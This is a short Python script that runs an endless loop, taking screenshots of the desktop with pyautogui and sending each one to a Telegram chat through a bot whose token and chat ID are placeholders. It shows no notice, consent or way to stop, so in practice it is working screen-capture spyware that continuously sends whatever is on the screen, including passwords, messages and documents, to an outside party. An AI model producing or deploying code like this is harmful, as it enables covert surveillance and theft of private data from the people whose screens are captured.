import pyautogui
from PIL import Image
from io import BytesIO
from telegram import Bot

def take_screenshot():
    screenshot = pyautogui.screenshot()
    return screenshot

def send_screenshot(bot_token, chat_id, screenshot):
    bot = Bot(token=bot_token)
    with BytesIO() as bio:
        screenshot.save(bio, format="PNG")
        bio.seek(0)
        bot.send_photo(chat_id=chat_id, photo=bio)

if __name__ == "__main__":
    BOT_TOKEN = "ChangeMe"
    
    CHAT_ID = "ChangeMe"
    
    while True:
        screenshot = take_screenshot()
        
        send_screenshot(BOT_TOKEN, CHAT_ID, screenshot)
